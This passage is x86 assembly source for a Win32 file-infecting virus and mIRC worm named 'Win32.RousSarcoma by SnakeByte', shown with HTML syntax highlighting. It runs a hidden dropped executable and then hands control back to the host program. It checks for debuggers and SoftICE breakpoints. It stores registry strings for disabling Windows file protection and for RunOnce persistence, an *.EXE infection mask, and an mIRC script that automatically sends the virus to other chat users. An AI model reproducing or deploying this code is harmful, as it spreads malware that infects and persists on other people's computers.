 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">YCloseHandle</span><span class="sc4">]</span><span class="sc0">


 </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; let's execute the virus</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">ProcessInformation</span><span class="sc4">]</span><span class="sc0"> 
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">StartupInfo</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; lpCurrentDirectory</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; lpEnvironment  </span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; Create_New_Process_Group &amp;amp; Normal_Priority_Class</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; bInheritHandles</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; lpThreadAttributes</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; lpProcessAttributes</span><span class="sc0">
 </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">HiddenFile</span><span class="sc4">]</span><span class="sc0"> 
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                  </span><span class="sc1">; filename with commandline</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; command line</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc5">XCreateProcessA</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc1">; -----------------------[ open original program ]---------------------------</span><span class="sc0">
</span><span class="sc1">; ***************************************************************************</span><span class="sc0">

</span><span class="sc5">ExecuteHost</span><span class="sc4">:</span><span class="sc0">

 </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">         </span><span class="sc1">; get back to old Imagebase+EIP</span><span class="sc0">
 </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
 </span><span class="sc5">retEIP</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">

 </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">12345678h</span><span class="sc0">
 </span><span class="sc9">org</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
 </span><span class="sc5">retBas</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">

 </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

 </span><span class="sc5">OldEIP</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
 </span><span class="sc5">OldBase</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">

 </span><span class="sc5">NewEIP</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">

 
</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc1">; --------------[ use GetProcAddress to retrieve API's ]---------------------</span><span class="sc0">
</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
                           </span><span class="sc1">; this procedure is used in both parts of the virus !</span><span class="sc0">
                           </span><span class="sc1">; esi point to the names</span><span class="sc0">
                           </span><span class="sc1">; edi to the place where we save the offsets</span><span class="sc0">
                           </span><span class="sc1">; ebx contains module handle</span><span class="sc0">
                           </span><span class="sc1">; ecx got the number of api's</span><span class="sc0">
</span><span class="sc5">GetAPI3</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                  </span><span class="sc1">; save number</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">                  </span><span class="sc1">; push Api-name </span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">                  </span><span class="sc1">; push Module-Handle</span><span class="sc0">
                           </span><span class="sc1">; call GetProcAddress</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'VA-A'</span><span class="sc0">           </span><span class="sc1">; if we are in the exe-part, we can call</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">API3b</span><span class="sc0">                  </span><span class="sc1">; the api directly</span><span class="sc0">

 </span><span class="sc6">pushad</span><span class="sc0">                    </span><span class="sc1">; check for int 1h tracing</span><span class="sc0">
 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                  </span><span class="sc1">; int 1h tracing destroys the stack, so we will see</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; if it is destroyed</span><span class="sc0">
 </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4d</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">EndApi3</span><span class="sc0">
 </span><span class="sc6">popad</span><span class="sc0">

</span><span class="sc5">API3a</span><span class="sc4">:</span><span class="sc0">                     </span><span class="sc1">; otherwise we need the one found in the kernel </span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">XGetProcAddress</span><span class="sc4">]</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">API3c</span><span class="sc0">

</span><span class="sc5">API3b</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetProcAddress</span><span class="sc0">

</span><span class="sc5">API3c</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">stosd</span><span class="sc0">                     </span><span class="sc1">; save offset</span><span class="sc0">

 </span><span class="sc6">pushad</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">                </span><span class="sc1">; Lets do a check for Softice Breakpoints</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">NoSICheck</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0CCh</span><span class="sc0">  </span><span class="sc1">; check for the breakpoint</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">EndApi3</span><span class="sc0">                </span><span class="sc1">; due to the pushad, we will ret somewhere strange ;)</span><span class="sc0">
</span><span class="sc5">NoSICheck</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">popad</span><span class="sc0">

 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">EndApi3</span><span class="sc0">

 </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">                  </span><span class="sc1">; point to next name</span><span class="sc0">

</span><span class="sc5">SearchZero</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
 </span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">GotZero</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">SearchZero</span><span class="sc0">
 
</span><span class="sc5">GotZero</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
 </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
 </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">GetAPI3</span><span class="sc0">               </span><span class="sc1">; get next api</span><span class="sc0">

 </span><span class="sc5">EndApi3</span><span class="sc4">:</span><span class="sc0"> 
 </span><span class="sc6">ret</span><span class="sc0"> 


</span><span class="sc1">; ###########################################################################</span><span class="sc0">
</span><span class="sc1">; ----------------------[ Third Part - The Data ]----------------------------</span><span class="sc0">
</span><span class="sc1">; ###########################################################################</span><span class="sc0">

</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc1">; ---------------------[ Data of the second part ]---------------------------</span><span class="sc0">
</span><span class="sc1">; ***************************************************************************</span><span class="sc0">

</span><span class="sc5">NumberOf2Kernel32APIS</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

</span><span class="sc5">Kernel32Names2</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'WriteFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateProcessA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">HiddenFile</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'C:\RousSarc.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0"> </span><span class="sc1">; Rous Sarkoma is a well known Retro Virus</span><span class="sc0">
</span><span class="sc5">KERNEL32</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'kernel32.dll'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; kernel32.dll .. :)</span><span class="sc0">

</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc1">; ---------------------------[ Some Data ]-----------------------------------</span><span class="sc0">
</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc5">VirusEnd</span><span class="sc4">:</span><span class="sc0">

 </span><span class="sc5">K32Handle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">          </span><span class="sc1">; Hier speichern wir das Handle der Kernel32.dll </span><span class="sc0">

 </span><span class="sc5">XLoadLibraryA</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">   </span><span class="sc1">; Hier die Offsets der ersten beiden API's</span><span class="sc0">
 </span><span class="sc5">XGetProcAddress</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

                           </span><span class="sc1">; API's we need for the second part</span><span class="sc0">
 </span><span class="sc5">YCreateFileA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc5">YCloseHandle</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc5">YWriteFile</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
 </span><span class="sc5">YCreateProcessA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

 </span><span class="sc5">StartofVirusinFile</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
 </span><span class="sc5">Write</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">

                           </span><span class="sc1">; Daten fr die Kernel-Suche</span><span class="sc0">
 </span><span class="sc5">KernelAddy</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">; PE-Header</span><span class="sc0">
 </span><span class="sc5">MZAddy</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">       </span><span class="sc1">; MZ-Header</span><span class="sc0">
 </span><span class="sc5">counter</span><span class="sc0">  </span><span class="sc9">dw</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">           </span><span class="sc1">; Wie viele Namen haben wir getestet</span><span class="sc0">

 </span><span class="sc5">ATableVA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">           </span><span class="sc1">; Address Table VA</span><span class="sc0">
 </span><span class="sc5">NTableVA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">           </span><span class="sc1">; Name Pointer Table VA</span><span class="sc0">
 </span><span class="sc5">OTableVA</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">           </span><span class="sc1">; Name Pointer Table VA</span><span class="sc0">

</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc1">; --------------------[ Initialized First Part Data ]------------------------</span><span class="sc0">
</span><span class="sc1">; ***************************************************************************</span><span class="sc0">

</span><span class="sc9">.DATA</span><span class="sc0">
 </span><span class="sc5">CopyRight</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Win32.RousSarcoma by SnakeByte'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

 </span><span class="sc5">_2kProt</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">_2kProtValue</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SfcDisable'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">RunOnceName</span><span class="sc0">  </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'\RousSarc.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">RunOnceKey</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

 </span><span class="sc5">filemask</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'*.EXE'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">; get exe-files</span><span class="sc0">

 </span><span class="sc1">; Data for mIRC Worming</span><span class="sc0">
 </span><span class="sc5">MIRCscript</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'[script]'</span><span class="sc4">,</span><span class="sc2">13d</span><span class="sc4">,</span><span class="sc2">10d</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'n0=on 1:join:#: { if ( $nick == $me ) halt'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13d</span><span class="sc4">,</span><span class="sc2">10d</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'n1=     else .timer 1 30 .dcc send $nick C:\RousSarc.EXE }'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13d</span><span class="sc4">,</span><span class="sc2">10d</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'n2=on *:filesent:*.*: { if ( $nick != $me ) .dcc send $nick C:\RousSarc.EXE }'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13d</span><span class="sc4">,</span><span class="sc2">10d</span><span class="sc0">
 </span><span class="sc5">EndScript</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc5">mircINI</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'mirc.ini'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">MIRCrfiles</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'rfiles'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">        </span><span class="sc1">;what to patch</span><span class="sc0">
 </span><span class="sc5">MOffset</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'n2'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc5">MIRCprot</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'RousSarc.ini'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

                           </span><span class="sc1">; Names of the API's we need</span><span class="sc0">
</span><span class="sc5">Kernel32Names</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc5">NumberOfKernel32APIS</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">21d</span><span class="sc0">

 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FindFirstFileA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FindNextFileA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'FindClose'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateFileA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CloseHandle'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateFileMappingA'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'MapViewOfFile'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'UnmapViewOfFile'</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetCommandLineA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ReadFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CreateProcessA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetSystemDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'CopyFileA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetCurrentProcessId'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'RegisterServiceProcess'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetCurrentDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SetCurrentDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetWindowsDirectoryA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GetFullPathNameA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'WritePrivateProfileStringA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'WriteFile'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

 </span><span class="sc5">advname</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'advapi32'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">AdvapiNames</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc5">NumberOfAdvapiAPIS</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">

 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'RegOpenKeyExA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'RegQueryValueExA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'RegCloseKey'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'RegSetValueExA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'RegCreateKeyExA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'RegEnumKeyA'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">StartupInfo</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">64d</span><span class="sc0">
 </span><span class="sc9">db</span><span class="sc0">     </span><span class="sc2">63d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">ProcessInformation</span><span class="sc4">:</span><span class="sc0">
 </span><span class="sc5">hProcess</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
 </span><span class="sc5">hThread</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0"> 
 </span><span class="sc5">dwProcessId</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">
 </span><span class="sc5">dwThreadId</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">0h</span><span class="sc0">

</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc1">; -------------------[ Uninitialized First Part Data ]-----------------------</span><span class="sc0">
</span><span class="sc1">; ***************************************************************************</span><span class="sc0">
</span><span class="sc9">.DATA?</span><span class="sc0">
                           </span><span class="sc1">; API's we need for first Part</span><span class="sc0">
 </span><span class="sc5">XFindFirstFileA</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">XFindNextFileA</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">XFindClose</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">XCreateFileA</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">XCloseHandle</span><span class="sc0">                 </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">XCreateFileMappingA</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">XMapViewOfFile</span><span class="sc0">               </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">XUnmapViewOfFile</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">XGetCommandLineA</span><span class="sc0">             </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">XReadFile</span><span class="sc0">                    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">XCreateProcessA</span><span class="sc0">              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">XGetSystemDirectoryA</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">XCopyFileA</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">XGetCurrentProcessId</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">XRegisterServiceProcess</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">XGetCurrentDirectoryA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">XSetCurrentDirectoryA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">XGetWindowsDirectoryA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">XGetFullPathNameA</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">XWritePrivateProfileStringA</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
 </span><span class="sc5">XWriteFile</span><span class="sc0">                   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

                           </span><span class="sc1">; API's we need to edit the Registry</span><span class="sc0">
 </span><span class="sc5">XRegOpenKeyExA</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
